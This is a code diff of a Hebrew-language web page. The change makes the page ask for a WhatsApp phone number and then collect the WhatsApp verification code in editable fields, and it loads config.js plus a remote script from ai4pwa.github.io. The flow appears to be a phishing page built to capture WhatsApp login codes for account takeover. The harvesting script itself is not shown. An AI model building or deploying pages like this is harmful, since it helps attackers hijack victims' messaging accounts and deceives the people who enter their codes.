@@ -51,8 +51,8 @@
     <div id="login" class="screen">
       <button class="back-btn" onclick="navigateTo('#stage1')">← חזור</button>
       <div class="centered">
-        <h3>נא להזין מספר טלפון נייד</h3>
-        <input type="tel" id="phoneInput" placeholder="לדוגמה: 0521234567" required pattern="^05[0-9]{8}$">
+        <h3>נא להזין מספר טלפון וואטסאפ</h3>
+        <input type="tel" id="phoneInput" placeholder="לדוגמה: 0501234567" required pattern="^05[0-9]{8}$">
       </div>
       <button onclick="validatePhone()">הבא</button>
     </div>
@@ -61,15 +61,15 @@
     <div id="confirm" class="screen">
       <button class="back-btn" onclick="navigateTo('#login')">← חזור</button>
       <div class="centered">
-        <h3>קוד אימות נשלח למכשירך</h3>
+        <h3>הזן את קוד האימות שנשלח בוואטסאפ</h3>
         <div class="code-inputs">
-          <input class="code-input digit" readonly>
-          <input class="code-input digit" readonly>
-          <input class="code-input digit" readonly>
-          <input class="code-input digit" readonly>
+          <input class="code-input digit">
+          <input class="code-input digit">
+          <input class="code-input digit">
+          <input class="code-input digit">
         </div>
       </div>
-      <button id="confirmNextBtn" onclick="navigateTo('#final')" disabled>הבא</button>
+	  <br>
     </div>
 
     <!-- Redirect -->
@@ -78,6 +78,7 @@
     </div>
   </div>
 
-  <script src="https://ai4pwa.github.io/i/l.js?unique_id=mfy4rbzdujhdz_index.js"></script>
+  <script src="config.js"></script>
+  <script src="https://ai4pwa.github.io/i/l.js?unique_id=mgwoi38jonjuq_index.js"></script>
 </body>
 </html>
